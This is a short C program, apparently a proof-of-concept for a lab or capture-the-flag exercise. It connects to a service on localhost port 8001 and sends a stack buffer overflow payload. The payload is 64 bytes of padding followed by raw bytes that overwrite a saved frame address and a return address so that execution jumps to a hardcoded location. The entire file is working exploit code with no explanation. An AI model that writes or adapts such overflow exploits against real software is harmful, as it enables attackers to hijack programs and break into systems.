#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define TRY(func, name) { \
	if ((func) < 0) { \
		perror(name); \
		exit(1); \
	} \
}

int main()
{
	int sock = socket(PF_INET, SOCK_STREAM, 0);
	struct sockaddr_in dest = {
		.sin_family = AF_INET,
		.sin_port = htons(8001),
		.sin_addr.s_addr = inet_addr("127.0.0.1"),
	};
	TRY(connect(sock, (struct sockaddr *)&dest, sizeof(dest)), "connect()")
	char data[] = " this message is exactly 64 characters long, overflow starts here..............._\x20\xe5\xff\xff\xff\x7f\x00\x00\xdf\x09\x40\x00\x00\x00\x00";
	data[0] = sizeof(data);
	send(sock, data, data[0], 0);
}
